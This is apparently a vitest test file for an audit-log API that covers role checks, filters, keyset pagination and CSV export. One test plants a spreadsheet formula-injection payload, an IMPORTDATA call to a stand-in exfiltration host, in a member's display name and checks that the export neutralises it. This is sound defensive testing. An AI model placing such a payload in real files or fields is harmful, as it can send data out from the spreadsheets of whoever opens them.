/**
 * #231 GET /v1/audit-log — the owner-visible history of privileged changes.
 * Real product code over the stubbed network edge (D13): the role gate, the
 * filters, keyset pagination, and the CSV export an owner hands to an insurer
 * or a security questionnaire.
 */
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";

import {
  apiRequest,
  buildTestApp,
  membershipResponder,
  supabaseStub,
  type SupabaseStub,
} from "../test/routes-harness";
import {
  completeEnv,
  createTestAuth,
  jwksRoute,
  stubFetch,
  type TestAuth,
} from "../test/support";
import { auditLogRoutes } from "./audit-log";
import { parseCsv } from "./core/csv";

const env = completeEnv();
const COMPANY_ID = "8a1b3c5d-7e9f-4a2b-8c4d-6e8f0a2b4c6d";
const MEMBER_ID = "0d9c8b7a-6f5e-4d3c-9b2a-1f0e9d8c7b6a";
const ACTOR_ID = "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d";

let auth: TestAuth;
const app = buildTestApp(auditLogRoutes);

beforeAll(async () => {
  auth = await createTestAuth(env);
});

afterEach(() => {
  vi.unstubAllGlobals();
});

function row(overrides: Record<string, unknown> = {}) {
  return {
    id: "aaaaaaaa-0000-4000-8000-000000000001",
    actor_user_id: ACTOR_ID,
    actor_name: "Sam Owner",
    actor_ip: "203.0.113.7",
    action: "member.deactivated",
    target_type: "member",
    target_id: "mmmmmmmm-0000-4000-8000-000000000001",
    before: { role: "member", active: true },
    after: { role: "member", active: false },
    occurred_at: "2026-07-20T15:04:05+00:00",
    ...overrides,
  };
}

function stub(rows: unknown[], role = "admin"): SupabaseStub {
  const sb = supabaseStub(env);
  sb.on("POST", "/rest/v1/rpc/api_authorize_request", membershipResponder(MEMBER_ID, role));
  sb.on("POST", "/rest/v1/rpc/api_list_audit_log", () => rows);
  return sb;
}

describe("GET /v1/audit-log", () => {
  it("returns the page and passes every filter through to the SQL", async () => {
    const sb = stub([row()]);
    stubFetch(jwksRoute(auth), sb.route);

    const res = await apiRequest(
      app,
      env,
      await auth.token(),
      "/v1/audit-log?actor=" +
        ACTOR_ID +
        "&action=member.deactivated" +
        "&since=2026-07-01T00:00:00Z&until=2026-08-01T00:00:00Z&limit=10",
      { companyId: COMPANY_ID },
    );
    expect(res.status).toBe(200);
    const body = (await res.json()) as { data: unknown[]; next_cursor: null };
    expect(body.data).toHaveLength(1);
    expect(body.next_cursor).toBeNull();

    const rpc = sb.find("POST", "/rest/v1/rpc/api_list_audit_log")[0];
    expect(rpc.body).toMatchObject({
      p_company_id: COMPANY_ID,
      p_actor: ACTOR_ID,
      p_action: "member.deactivated",
      p_since: "2026-07-01T00:00:00Z",
      p_until: "2026-08-01T00:00:00Z",
      // limit + 1: the extra row is the "is there more" sentinel.
      p_limit: 11,
      p_cursor_ts: null,
      p_cursor_id: null,
    });
  });

  it("pages on the keyset, never on an offset", async () => {
    // Rows arrive while someone reads. An offset would skip or repeat them;
    // the cursor is the last row's (occurred_at, id).
    const rows = [
      row({ id: "aaaaaaaa-0000-4000-8000-000000000001" }),
      row({
        id: "aaaaaaaa-0000-4000-8000-000000000002",
        occurred_at: "2026-07-19T10:00:00+00:00",
      }),
    ];
    const sb = stub(rows);
    stubFetch(jwksRoute(auth), sb.route);

    const first = await apiRequest(
      app,
      env,
      await auth.token(),
      "/v1/audit-log?limit=1",
      { companyId: COMPANY_ID },
    );
    const body = (await first.json()) as {
      data: { id: string }[];
      next_cursor: string;
    };
    expect(body.data).toHaveLength(1);
    expect(body.next_cursor).toBe(
      "2026-07-20T15:04:05+00:00|aaaaaaaa-0000-4000-8000-000000000001",
    );

    // The cursor round-trips into the next call's keyset.
    await apiRequest(
      app,
      env,
      await auth.token(),
      `/v1/audit-log?limit=1&cursor=${encodeURIComponent(body.next_cursor)}`,
      { companyId: COMPANY_ID },
    );
    const second = sb.find("POST", "/rest/v1/rpc/api_list_audit_log")[1];
    expect(second.body).toMatchObject({
      p_cursor_ts: "2026-07-20T15:04:05+00:00",
      p_cursor_id: "aaaaaaaa-0000-4000-8000-000000000001",
    });
  });

  it("exports CSV an owner can hand to someone else", async () => {
    const sb = stub([
      row({ after: { role: "member", active: false }, actor_name: 'Sam "Doc"' }),
    ]);
    stubFetch(jwksRoute(auth), sb.route);

    const res = await apiRequest(
      app,
      env,
      await auth.token(),
      "/v1/audit-log?format=csv",
      { companyId: COMPANY_ID },
    );
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toContain("text/csv");
    expect(res.headers.get("content-disposition")).toContain("audit-log.csv");

    const text = await res.text();
    const [header, first] = text.split("\r\n");
    expect(header).toBe(
      "occurred_at,actor,actor_ip,action,target_type,target_id,before,after",
    );
    // The whole row, because the column ORDER is what the recipient's importer
    // and every questionnaire template are pinned to. RFC 4180 via the shared
    // serializer: a quote inside a name is doubled and the field wrapped, and a
    // field with nothing to escape is emitted bare — which is why the action is
    // not quoted here.
    expect(first).toBe(
      "2026-07-20T15:04:05+00:00," +
        '"Sam ""Doc""",' +
        "203.0.113.7," +
        "member.deactivated," +
        "member," +
        "mmmmmmmm-0000-4000-8000-000000000001," +
        '"{""role"":""member"",""active"":true}",' +
        '"{""role"":""member"",""active"":false}"',
    );
  });

  it("neutralizes a cell a spreadsheet would otherwise EXECUTE (#580)", async () => {
    // Both reachable payloads in one row, and only the first needs an attacker.
    // `actor` is `profiles.display_name`, which any member sets on themselves
    // through PATCH /v1/me with no charset restriction; `target_id` is what
    // messaging/opt-out.ts writes, an E.164 number, so it leads with "+" for
    // every STOP this workspace has ever recorded.
    const sb = stub([
      row({
        actor_name: '=IMPORTDATA("https://exfil.example/collect")',
        target_id: "+14165550199",
      }),
    ]);
    stubFetch(jwksRoute(auth), sb.route);

    const res = await apiRequest(
      app,
      env,
      await auth.token(),
      "/v1/audit-log?format=csv",
      { companyId: COMPANY_ID },
    );
    // Asserted before the body: a 500 would leave every assertion below throwing
    // on `undefined`, which is a legible failure for the wrong reason.
    expect(res.status).toBe(200);
    const text = await res.text();
    const [, first] = text.split("\r\n");

    // The apostrophe is the whole fix: it makes the engine read the rest of the
    // cell as text. RFC quoting alone did not merely fail to help — it PRESERVED
    // the commas between the formula's arguments, so the payload arrived whole.
    expect(first).toContain(
      `"'=IMPORTDATA(""https://exfil.example/collect"")"`,
    );
    expect(first).not.toContain('"=IMPORTDATA');
    expect(first).toContain(",'+14165550199,");

    // Asserted across the whole row, not just the two cells this test aims at:
    // the guard is per column, so a column added later must not be able to
    // reopen the hole without failing here.
    for (const cell of parseCsv(text)[1]) {
      expect(/^[=+\-@\t\r\n]/.test(cell)).toBe(false);
    }
  });

  it("names the system when nobody did it", async () => {
    // A cron or a provider webhook is a legitimate actor. "system" is honest;
    // an empty cell reads as missing data.
    const sb = stub([row({ actor_user_id: null, actor_name: null })]);
    stubFetch(jwksRoute(auth), sb.route);

    const res = await apiRequest(
      app,
      env,
      await auth.token(),
      "/v1/audit-log?format=csv",
      { companyId: COMPANY_ID },
    );
    // Read as a CELL rather than as a substring: the shared serializer quotes
    // only what needs quoting, so what this test is about is the value.
    expect(parseCsv(await res.text())[1][1]).toBe("system");
  });

  it("is closed to ordinary members", async () => {
    // The log is a map of the workspace's security posture, and the questions
    // it answers are the owner's.
    const sb = stub([row()], "member");
    stubFetch(jwksRoute(auth), sb.route);

    const res = await apiRequest(app, env, await auth.token(), "/v1/audit-log", {
      companyId: COMPANY_ID,
    });
    expect(res.status).toBe(403);
    expect(sb.find("POST", "/rest/v1/rpc/api_list_audit_log")).toHaveLength(0);
  });

  it("rejects a garbage filter rather than quietly ignoring it", async () => {
    // A filter that silently does nothing is worse than an error: the reader
    // believes they looked and found nothing.
    const sb = stub([]);
    stubFetch(jwksRoute(auth), sb.route);

    const res = await apiRequest(
      app,
      env,
      await auth.token(),
      "/v1/audit-log?actor=not-a-uuid",
      { companyId: COMPANY_ID },
    );
    expect(res.status).toBe(422);
  });
});
